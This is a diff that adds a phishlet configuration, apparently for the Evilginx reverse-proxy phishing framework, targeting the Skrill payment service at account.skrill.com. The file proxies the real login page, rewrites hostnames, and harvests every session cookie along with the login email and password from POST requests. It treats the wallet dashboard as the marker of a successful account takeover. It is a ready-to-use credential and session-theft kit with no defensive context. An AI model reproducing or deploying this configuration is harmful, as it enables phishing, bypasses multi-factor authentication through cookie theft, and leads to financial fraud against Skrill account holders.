@@ -1,0 +1,26 @@
+name: 'skrill'
+author: 'IMPERATOR'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'skrill.com', session: true, is_landing: true, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'skrill.com', orig_sub: 'account', domain: 'skrill.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname__regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'skrill.com', orig_sub: 'account', domain: 'skrill.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: '.account.skrill.com'
+    keys: ['.*,regexp']
+auth_urls: 
+ - 'wallet/ng/dashboard'
+credentials:
+  username:
+    key: 'login_email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'login_password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'account.skrill.com'
+  path: 'wallet/account/login' 
